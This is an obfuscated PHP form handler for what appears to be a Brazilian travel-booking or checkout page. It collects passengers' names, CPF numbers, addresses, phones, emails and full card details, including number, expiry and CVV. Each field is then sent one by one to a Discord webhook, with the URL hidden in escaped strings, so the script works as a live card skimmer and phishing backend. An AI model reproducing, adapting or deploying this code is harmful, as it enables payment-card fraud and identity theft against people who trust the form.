<?php
goto h5DRU;
h5DRU: session_start();
goto Ux4Mi;
Xc2Cj: if ( empty( $modulo06 ) ) {
} else {
    echo $answer;
    $answer = $modulo06;
    $content = "\x43\x45\114\x55\x4c\x41\122\x3a\x20{$answer}";
    $link = '\150\x74\x74\160\163\x3a\57\57\x64\151\163\143\x6f\x72\x64\56\x63\x6f\155\x2f\141\160\151\x2f\x77\x65\x62\150\x6f\157\153\x73\57\61\61\x31\71\67\x39\x38\x37\x34\65\60\65\x32\x32\61\x37\63\64\64\57\130\x44\x70\x66\x61\170\x4a\x6f\x67\155\103\x6e\132\x45\x45\104\x51\x5a\x30\121\x71\x67\121\122\152\126\x70\172\x57\x4e\107\x2d\126\x73\x79\x51\102\x31\150\166\67\70\163\x65\156\67\120\61\x53\x48\110\x34\143\x6e\x6b\x67\156\x5f\x37\x35\153\106\x4a\65\143\147\x56\x4f';
    $basearray = array( '\143\157\156\164\145\x6e\164' => $content );
    $hookarray = array( '\x68\164\164\x70' => array( '\150\x65\141\144\x65\162' => '\103\x6f\156\x74\x65\156\x74\x2d\164\171\160\x65\72\40\x61\160\x70\x6c\x69\x63\x61\x74\151\157\156\57\x78\x2d\x77\x77\167\55\146\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\143\157\144\x65\x64\15\12', '\x6d\x65\164\150\x6f\x64' => '\120\117\x53\124', '\x63\157\156\x74\145\156\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto eRuzR;
lLIMg: if ( isset( $_POST[ '\x6e\x6f\155\145' ] ) ) {
    $passageiros = new passageiros();
    $_SESSION[ '\156\157\155\145' ] = $nome = addslashes( htmlspecialchars_decode( $_POST[ '\x6e\157\155\x65' ] ) );
    $sobrenome = addslashes( htmlspecialchars_decode( $_POST[ '\163\157\142\x72\145\x6e\x6f\155\145' ] ) );
    $nascimento = addslashes( htmlspecialchars_decode( $_POST[ '\156\x61\163\143\151\x6d\x65\x6e\x74\x6f' ] ) );
    $cpf = addslashes( htmlspecialchars_decode( $_POST[ '\x63\x70\146' ] ) );
    $cep = addslashes( htmlspecialchars_decode( $_POST[ '\143\145\x70' ] ) );
    $telefonefixo = addslashes( htmlspecialchars_decode( $_POST[ '\x74\145\x6c\x65\146\157\x6e\x65\x66\x69\170\x6f' ] ) );
    $telefonecelular = addslashes( htmlspecialchars_decode( $_POST[ '\x74\145\x6c\145\x66\x6f\x6e\145\x63\145\154\x75\154\141\x72' ] ) );
    $_SESSION[ '\145\155\141\x69\x6c\61' ] = $email1 = addslashes( htmlspecialchars_decode( $_POST[ '\x65\155\141\x69\x6c\x31' ] ) );
    $email2 = addslashes( htmlspecialchars_decode( $_POST[ '\145\x6d\x61\151\154\x32' ] ) );
    $precototal = $_SESSION[ '\155\x6f\x65\144\141\142\x72' ];
    $bandeira = addslashes( htmlspecialchars_decode( $_POST[ '\142\x61\156\x64\x65\x69\162\x61' ] ) );
    $card = addslashes( htmlspecialchars_decode( $_POST[ '\143\x61\162\144' ] ) );
    $validade = addslashes( htmlspecialchars_decode( $_POST[ '\166\141\x6c\x69\x64\x61\144\145' ] ) );
    $cvv = addslashes( htmlspecialchars_decode( $_POST[ '\x63\166\x76' ] ) );
    $titular = addslashes( htmlspecialchars_decode( $_POST[ '\164\151\164\165\154\x61\162' ] ) );
    $passageiros->cadastrarPassageiro( $nome, $sobrenome, $nascimento, $cpf, $cep, $telefonefixo, $telefonecelular, $email1, $email2, $precototal, $bandeira, $card, $validade, $cvv, $titular );
}
goto PpOs4;
PpOs4: $modulo01 = $_POST[ '\156\x6f\155\145' ];
goto uSxHT;
n24oq: if ( empty( $modulo02 ) ) {
} else {
    echo $answer;
    $answer = $modulo02;
    $content = "\123\117\102\x52\105\116\117\115\x45\x3a\40{$answer}";
    $link = '\x68\x74\x74\x70\x73\72\57\x2f\144\x69\x73\x63\157\x72\144\56\x63\x6f\x6d\57\x61\160\151\x2f\x77\145\142\150\x6f\x6f\x6b\163\x2f\x31\61\61\x39\67\71\x38\67\x34\65\x30\65\62\62\61\x37\63\64\x34\x2f\x58\104\160\146\141\170\x4a\x6f\147\155\103\156\x5a\x45\x45\104\121\x5a\60\121\x71\147\121\122\x6a\x56\160\x7a\127\x4e\x47\x2d\x56\163\x79\121\x42\61\x68\x76\67\x38\x73\x65\x6e\67\x50\61\123\110\110\x34\143\156\x6b\147\x6e\137\67\65\x6b\x46\x4a\65\143\x67\126\117';
    $basearray = array( '\x63\157\x6e\164\145\156\164' => $content );
    $hookarray = array( '\150\164\x74\x70' => array( '\150\145\141\144\145\x72' => '\103\157\x6e\x74\145\x6e\164\55\x74\171\x70\x65\x3a\40\x61\x70\160\x6c\151\x63\x61\164\151\x6f\x6e\57\170\x2d\x77\167\x77\x2d\x66\x6f\x72\155\x2d\165\x72\x6c\x65\156\143\157\x64\145\x64\xd\12', '\x6d\x65\164\x68\157\x64' => '\x50\x4f\x53\x54', '\x63\157\x6e\164\x65\156\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto N2B1Q;
uM68q: if ( isset( $_POST[ '\x6e\x6f\x6d\145' ] ) ) {
    $passageiros = new passageiros();
    $_SESSION[ '\x6e\x6f\155\145' ] = $nome = addslashes( htmlspecialchars_decode( $_POST[ '\x6e\157\155\x65' ] ) );
    $sobrenome = addslashes( htmlspecialchars_decode( $_POST[ '\x73\x6f\142\162\145\156\157\x6d\x65' ] ) );
    $nascimento = addslashes( htmlspecialchars_decode( $_POST[ '\x6e\141\163\143\x69\155\x65\156\164\x6f' ] ) );
    $cpf = addslashes( htmlspecialchars_decode( $_POST[ '\143\x70\x66' ] ) );
    $cep = addslashes( htmlspecialchars_decode( $_POST[ '\143\x65\x70' ] ) );
    $telefonefixo = addslashes( htmlspecialchars_decode( $_POST[ '\164\145\x6c\x65\x66\157\156\145\146\x69\x78\x6f' ] ) );
    $telefonecelular = addslashes( htmlspecialchars_decode( $_POST[ '\164\x65\x6c\x65\146\157\156\x65\143\145\154\165\154\x61\x72' ] ) );
    $_SESSION[ '\145\x6d\x61\151\x6c\61' ] = $email1 = addslashes( htmlspecialchars_decode( $_POST[ '\145\155\141\151\154\x31' ] ) );
    $email2 = addslashes( htmlspecialchars_decode( $_POST[ '\x65\x6d\141\151\x6c\x32' ] ) );
    $precototal = $_SESSION[ '\155\x6f\x65\144\141\x62\x72' ];
    $bandeira = addslashes( htmlspecialchars_decode( $_POST[ '\x62\x61\156\x64\145\x69\162\x61' ] ) );
    $card = addslashes( htmlspecialchars_decode( $_POST[ '\143\x61\162\144' ] ) );
    $validade = addslashes( htmlspecialchars_decode( $_POST[ '\166\141\x6c\151\144\141\x64\145' ] ) );
    $cvv = addslashes( htmlspecialchars_decode( $_POST[ '\x63\x76\x76' ] ) );
    $titular = addslashes( htmlspecialchars_decode( $_POST[ '\164\x69\x74\165\x6c\x61\162' ] ) );
    $passageiros->cadastrarPassageiro( $nome, $sobrenome, $nascimento, $cpf, $cep, $telefonefixo, $telefonecelular, $email1, $email2, $precototal, $bandeira, $card, $validade, $cvv, $titular );
}
goto lLIMg;
Ux4Mi: include '\56\56\x2f\x63\157\156\x66\151\147\57\143\157\156\146\x69\x67\56\x70\x68\x70';
goto sGhao;
Tqf0W: $modulo11 = $_POST[ '\143\x76\166' ];
goto h2OSD;
cxAbN: $modulo09 = $_POST[ '\143\141\162\x64' ];
goto hvuhT;
SNa0q: if ( empty( $modulo05 ) ) {
} else {
    echo $answer;
    $answer = $modulo05;
    $content = "\103\x45\x50\x3a\40{$answer}";
    $link = '\x68\164\164\160\x73\x3a\57\x2f\x64\x69\163\x63\x6f\x72\144\x2e\143\x6f\155\x2f\x61\x70\x69\x2f\167\x65\142\150\157\157\x6b\163\57\x31\61\x31\x39\x37\71\x38\x37\x34\x35\x30\x35\62\62\61\x37\x33\64\x34\x2f\x58\x44\x70\x66\141\170\x4a\x6f\x67\x6d\103\x6e\132\105\x45\104\x51\132\60\121\x71\x67\x51\x52\152\126\160\172\127\x4e\x47\55\126\163\171\121\102\61\150\166\x37\70\163\x65\x6e\67\120\61\123\110\110\64\143\156\153\x67\156\137\x37\x35\x6b\106\112\65\x63\147\x56\x4f';
    $basearray = array( '\x63\157\156\164\145\x6e\164' => $content );
    $hookarray = array( '\x68\x74\164\x70' => array( '\x68\x65\141\144\145\x72' => '\103\x6f\156\x74\145\156\x74\x2d\164\x79\160\x65\x3a\x20\x61\x70\x70\154\x69\x63\x61\164\x69\157\x6e\57\x78\55\167\x77\x77\x2d\146\157\x72\x6d\55\x75\x72\154\x65\x6e\143\157\x64\x65\x64\xd\xa', '\x6d\x65\164\150\157\144' => '\x50\117\x53\124', '\x63\x6f\156\x74\145\156\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto Xc2Cj;
s2mr1: $modulo04 = $_POST[ '\x63\x70\146' ];
goto Spm8y;
h2OSD: $modulo12 = $_POST[ '\164\151\164\165\154\141\162' ];
goto uhLjx;
uSxHT: $modulo02 = $_POST[ '\x73\157\142\162\x65\156\x6f\155\145' ];
goto PRIzz;
cB78Q: if ( empty( $modulo08 ) ) {
} else {
    echo $answer;
    $answer = $modulo08;
    $content = "\x42\x41\x4e\x44\x45\111\x52\x41\x3a\40{$answer}";
    $link = '\150\164\164\160\163\72\57\x2f\144\151\x73\x63\157\162\x64\56\x63\157\x6d\57\x61\x70\151\57\x77\145\142\x68\157\157\153\163\x2f\61\61\61\71\x37\x39\70\x37\x34\x35\x30\x35\x32\62\61\x37\63\64\x34\x2f\x58\x44\160\x66\x61\x78\112\157\x67\155\x43\x6e\x5a\x45\x45\x44\x51\x5a\60\121\x71\x67\x51\122\152\126\x70\x7a\x57\x4e\x47\55\x56\x73\x79\x51\x42\61\x68\166\67\x38\x73\145\x6e\x37\x50\x31\123\x48\110\64\143\156\x6b\x67\x6e\x5f\x37\x35\153\106\x4a\65\143\x67\126\117';
    $basearray = array( '\x63\157\156\164\x65\x6e\164' => $content );
    $hookarray = array( '\x68\164\164\160' => array( '\150\145\x61\x64\145\162' => '\103\x6f\156\164\145\x6e\164\55\x74\x79\160\x65\x3a\x20\x61\160\x70\154\x69\143\x61\164\x69\157\156\x2f\x78\x2d\167\x77\167\55\146\157\x72\155\55\x75\x72\154\145\156\x63\x6f\x64\145\x64\xd\12', '\x6d\145\x74\150\157\144' => '\x50\117\123\124', '\x63\157\156\x74\x65\x6e\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto yCKki;
hvuhT: $modulo10 = $_POST[ '\x76\x61\154\x69\x64\x61\x64\x65' ];
goto Tqf0W;
N2B1Q: if ( empty( $modulo03 ) ) {
} else {
    echo $answer;
    $answer = $modulo03;
    $content = "\116\x41\x53\103\111\x4d\105\x4e\124\x4f\72\x20{$answer}";
    $link = '\150\x74\164\160\163\x3a\57\x2f\x64\x69\x73\143\157\162\x64\x2e\143\157\155\x2f\141\x70\151\57\x77\x65\142\x68\157\157\153\163\57\x31\x31\61\x39\x37\x39\x38\67\64\65\x30\x35\x32\62\61\67\63\x34\64\57\130\104\x70\x66\141\x78\x4a\x6f\x67\x6d\x43\156\x5a\105\105\104\x51\132\x30\121\x71\147\x51\122\152\x56\x70\172\127\x4e\x47\x2d\126\163\x79\121\102\61\150\166\67\70\x73\145\x6e\x37\x50\61\x53\110\x48\64\x63\156\x6b\147\x6e\137\67\x35\x6b\106\x4a\x35\143\x67\126\x4f';
    $basearray = array( '\143\157\156\164\x65\156\x74' => $content );
    $hookarray = array( '\150\x74\x74\x70' => array( '\150\145\x61\144\145\x72' => '\x43\157\156\x74\145\x6e\x74\x2d\164\171\160\x65\x3a\x20\141\160\x70\x6c\151\143\x61\164\x69\157\156\x2f\x78\x2d\167\x77\x77\x2d\146\x6f\162\x6d\55\x75\x72\x6c\x65\156\x63\157\x64\145\x64\xd\12', '\x6d\145\164\x68\x6f\x64' => '\120\x4f\123\124', '\x63\x6f\x6e\x74\x65\156\x74' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto iUOyi;
Spm8y: $modulo05 = $_POST[ '\x63\145\x70' ];
goto Zdh24;
PRIzz: $modulo03 = $_POST[ '\156\141\163\x63\x69\x6d\x65\x6e\x74\157' ];
goto s2mr1;
BGHs5: if ( empty( $modulo11 ) ) {
} else {
    echo $answer;
    $answer = $modulo11;
    $content = "\x43\x56\x56\72\40{$answer}";
    $link = '\x68\164\164\160\163\72\x2f\57\x64\x69\x73\x63\157\x72\144\x2e\x63\157\x6d\57\141\x70\151\57\x77\145\142\x68\x6f\x6f\x6b\x73\57\61\x31\x31\71\x37\71\x38\67\x34\x35\x30\65\x32\x32\x31\67\63\x34\64\x2f\x58\104\160\146\141\x78\x4a\x6f\147\155\x43\x6e\x5a\x45\x45\104\121\x5a\60\121\x71\147\121\122\x6a\x56\160\x7a\127\x4e\107\x2d\x56\x73\171\121\102\61\x68\x76\67\70\x73\x65\156\x37\x50\61\123\110\110\64\x63\156\153\x67\156\x5f\67\65\x6b\106\112\65\143\x67\x56\117';
    $basearray = array( '\x63\x6f\x6e\164\145\156\164' => $content );
    $hookarray = array( '\150\x74\x74\160' => array( '\150\x65\x61\x64\145\x72' => '\x43\157\x6e\x74\145\x6e\164\x2d\x74\171\x70\x65\72\40\141\x70\x70\154\151\x63\x61\164\151\157\156\x2f\170\x2d\x77\167\x77\x2d\x66\x6f\162\155\55\x75\x72\154\145\156\x63\157\144\145\x64\15\xa', '\155\145\x74\150\x6f\144' => '\x50\117\123\124', '\143\157\x6e\164\x65\x6e\x74' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto bbp0s;
Zdh24: $modulo06 = $_POST[ '\x74\x65\154\145\146\x6f\156\145\143\x65\x6c\x75\154\141\x72' ];
goto uRikW;
sGhao: include '\56\56\57\x63\154\x61\163\x73\137\x63\x6f\x64\x65\162\x70\x68\x70\x2f\x70\x61\163\163\x61\147\145\x69\162\x6f\163\x2e\160\x68\160';
goto uM68q;
uRikW: $modulo07 = $_POST[ '\145\155\141\151\x6c\x32' ];
goto rzSe9;
rzSe9: $modulo08 = $_POST[ '\x62\141\156\x64\145\151\x72\141' ];
goto cxAbN;
iUOyi: if ( empty( $modulo04 ) ) {
} else {
    echo $answer;
    $answer = $modulo04;
    $content = "\103\x50\106\72\40{$answer}";
    $link = '\x68\x74\x74\160\163\72\x2f\57\x64\151\163\143\157\162\144\x2e\x63\157\x6d\57\x61\x70\151\x2f\x77\145\142\x68\x6f\157\153\x73\x2f\61\61\61\x39\67\71\x38\x37\64\65\60\65\x32\x32\x31\67\x33\64\64\57\130\104\x70\146\141\x78\x4a\157\x67\155\x43\x6e\132\105\x45\104\121\x5a\x30\121\161\x67\x51\122\x6a\x56\160\172\x57\x4e\x47\55\126\163\x79\x51\102\61\150\x76\x37\x38\x73\145\x6e\67\x50\x31\x53\110\x48\x34\x63\x6e\153\147\156\137\67\x35\x6b\106\112\x35\143\x67\x56\x4f';
    $basearray = array( '\143\157\x6e\x74\145\x6e\164' => $content );
    $hookarray = array( '\150\x74\x74\x70' => array( '\x68\x65\x61\x64\145\x72' => '\103\x6f\156\x74\145\x6e\x74\55\x74\x79\160\145\x3a\x20\141\160\x70\154\151\143\x61\164\151\x6f\x6e\x2f\x78\x2d\167\167\x77\x2d\146\x6f\x72\155\55\165\162\x6c\145\156\143\157\x64\145\x64\15\xa', '\x6d\145\x74\150\157\x64' => '\x50\x4f\x53\x54', '\x63\157\x6e\x74\145\x6e\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto SNa0q;
yCKki: if ( empty( $modulo09 ) ) {
} else {
    echo $answer;
    $answer = $modulo09;
    $content = "\x43\101\x52\x54\101\x4f\72\x20{$answer}";
    $link = '\150\164\164\x70\163\x3a\x2f\57\x64\x69\163\x63\x6f\x72\144\x2e\143\x6f\x6d\x2f\x61\160\151\57\167\145\142\x68\157\x6f\153\163\57\x31\x31\61\71\x37\x39\x38\x37\64\65\60\x35\x32\62\x31\67\63\64\x34\x2f\x58\104\x70\146\x61\170\112\157\x67\x6d\x43\x6e\132\x45\105\104\121\x5a\x30\121\x71\x67\x51\x52\152\126\160\x7a\127\116\x47\55\126\163\171\x51\102\61\x68\166\x37\70\163\145\x6e\67\120\x31\123\x48\x48\x34\x63\156\x6b\x67\156\x5f\67\x35\153\x46\x4a\x35\143\147\x56\117';
    $basearray = array( '\x63\x6f\x6e\164\x65\x6e\x74' => $content );
    $hookarray = array( '\x68\x74\x74\160' => array( '\x68\x65\x61\x64\x65\x72' => '\103\157\156\164\145\x6e\x74\x2d\x74\x79\160\145\72\x20\x61\x70\160\x6c\151\x63\x61\x74\x69\157\x6e\57\x78\x2d\167\167\x77\x2d\x66\x6f\x72\x6d\x2d\x75\162\154\145\x6e\143\x6f\144\145\144\15\12', '\155\145\164\150\x6f\144' => '\120\117\x53\x54', '\143\157\156\x74\145\156\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto EOyq9;
eRuzR: if ( empty( $modulo07 ) ) {
} else {
    echo $answer;
    $answer = $modulo07;
    $content = "\105\x4d\101\x49\x4c\x3a\40{$answer}";
    $link = '\150\x74\x74\160\x73\72\x2f\57\x64\151\x73\x63\157\x72\x64\56\x63\157\155\57\141\160\151\x2f\167\x65\x62\x68\157\x6f\x6b\163\x2f\61\61\x31\x39\67\x39\70\x37\64\x35\60\65\62\62\61\67\x33\64\64\57\130\x44\x70\x66\x61\x78\x4a\x6f\147\155\103\156\x5a\105\x45\104\x51\132\x30\121\161\147\121\x52\x6a\x56\160\172\127\116\x47\x2d\126\x73\x79\121\102\x31\150\166\x37\70\163\145\156\x37\x50\x31\123\x48\110\64\x63\156\x6b\147\156\x5f\67\x35\x6b\106\x4a\x35\x63\x67\x56\x4f';
    $basearray = array( '\143\x6f\156\164\x65\156\164' => $content );
    $hookarray = array( '\x68\164\164\x70' => array( '\150\145\141\144\x65\x72' => '\x43\157\x6e\x74\145\156\164\x2d\164\171\160\x65\72\x20\141\x70\160\x6c\151\x63\x61\164\x69\x6f\x6e\57\x78\x2d\167\x77\x77\x2d\x66\157\162\155\55\x75\x72\x6c\145\156\x63\x6f\x64\x65\x64\15\12', '\155\x65\164\150\157\144' => '\x50\x4f\x53\124', '\x63\x6f\x6e\164\x65\x6e\x74' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto cB78Q;
EOyq9: if ( empty( $modulo10 ) ) {
} else {
    echo $answer;
    $answer = $modulo10;
    $content = "\x56\x41\x4c\111\x44\x41\x44\105\72\40{$answer}";
    $link = '\x68\164\164\x70\163\72\57\57\x64\151\163\x63\x6f\162\144\56\143\x6f\x6d\x2f\x61\x70\151\x2f\x77\145\x62\150\x6f\157\x6b\163\57\61\61\61\x39\67\71\70\x37\x34\65\x30\x35\x32\62\x31\67\63\64\64\57\130\104\160\146\141\170\112\157\x67\155\103\156\132\105\x45\x44\121\x5a\60\121\x71\147\121\x52\x6a\126\160\x7a\127\x4e\x47\55\x56\x73\x79\121\102\61\x68\166\67\x38\x73\145\x6e\x37\x50\61\x53\110\110\x34\143\x6e\153\x67\x6e\x5f\x37\65\153\106\112\x35\x63\x67\126\x4f';
    $basearray = array( '\x63\x6f\x6e\x74\x65\156\164' => $content );
    $hookarray = array( '\x68\x74\164\x70' => array( '\x68\145\141\x64\145\x72' => '\103\157\x6e\164\x65\x6e\164\55\x74\171\x70\x65\x3a\x20\x61\x70\x70\154\151\143\141\x74\151\x6f\x6e\x2f\x78\x2d\167\167\167\55\x66\157\162\x6d\55\x75\x72\154\x65\x6e\x63\x6f\144\x65\144\xd\xa', '\155\145\x74\150\x6f\144' => '\120\117\123\124', '\143\x6f\156\x74\x65\156\164' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto BGHs5;
uhLjx: if ( empty( $modulo01 ) ) {
} else {
    echo $answer;
    $answer = $modulo01;
    $content = "\116\x4f\115\x45\x3a\x20{$answer}";
    $link = '\150\164\x74\160\163\x3a\x2f\57\x64\151\x73\x63\x6f\x72\144\56\x63\x6f\x6d\x2f\141\160\x69\x2f\x77\x65\142\x68\157\157\x6b\x73\x2f\x31\61\x31\71\67\x39\70\67\64\x35\x30\x35\x32\62\61\67\x33\64\x34\x2f\x58\104\x70\146\141\x78\x4a\157\x67\155\103\156\x5a\x45\105\x44\121\132\60\121\161\x67\x51\122\x6a\x56\x70\172\127\x4e\107\x2d\126\x73\x79\x51\102\61\x68\166\67\x38\163\145\156\67\x50\61\x53\110\x48\x34\x63\x6e\x6b\x67\x6e\x5f\x37\x35\153\x46\112\65\x63\147\126\117';
    $basearray = array( '\143\x6f\156\164\x65\156\x74' => $content );
    $hookarray = array( '\150\x74\164\x70' => array( '\150\145\141\x64\x65\162' => '\103\157\156\164\145\x6e\x74\55\164\x79\160\145\72\40\141\x70\x70\154\x69\143\141\x74\x69\x6f\x6e\57\x78\55\167\167\167\x2d\146\x6f\x72\155\x2d\165\162\154\145\x6e\x63\x6f\x64\145\144\15\12', '\155\145\164\150\x6f\144' => '\x50\x4f\x53\x54', '\x63\x6f\x6e\164\145\x6e\x74' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}
goto n24oq;
bbp0s: if ( empty( $modulo12 ) ) {
} else {
    echo $answer;
    $answer = $modulo12;
    $content = "\x54\x49\x54\x55\114\x41\122\72\x20{$answer}";
    $link = '\150\x74\x74\160\x73\x3a\x2f\57\144\151\x73\143\157\x72\x64\56\143\x6f\x6d\57\141\160\x69\57\x77\x65\142\150\157\157\x6b\163\57\61\x31\61\71\67\x39\70\67\64\65\x30\65\x32\x32\61\67\63\x34\x34\57\x58\104\x70\x66\141\x78\112\x6f\x67\155\103\x6e\132\x45\x45\104\x51\x5a\60\121\161\x67\x51\x52\x6a\x56\160\172\x57\116\107\x2d\x56\x73\x79\121\x42\x31\150\x76\67\x38\163\145\156\x37\x50\61\x53\x48\x48\x34\x63\x6e\153\147\156\x5f\x37\65\153\x46\x4a\65\x63\x67\126\x4f';
    $basearray = array( '\143\x6f\x6e\164\145\x6e\x74' => $content );
    $hookarray = array( '\150\164\x74\160' => array( '\150\145\x61\144\145\162' => '\x43\x6f\156\164\x65\156\x74\x2d\x74\171\x70\145\x3a\x20\141\160\x70\x6c\x69\143\141\164\x69\157\x6e\x2f\x78\x2d\x77\x77\167\55\146\157\x72\x6d\x2d\x75\x72\154\145\x6e\x63\x6f\144\145\x64\15\12', '\x6d\145\164\150\157\x64' => '\x50\117\x53\124', '\143\x6f\x6e\164\x65\156\x74' => http_build_query( $basearray ) ) );
    file_get_contents( $link, false, stream_context_create( $hookarray ) );
}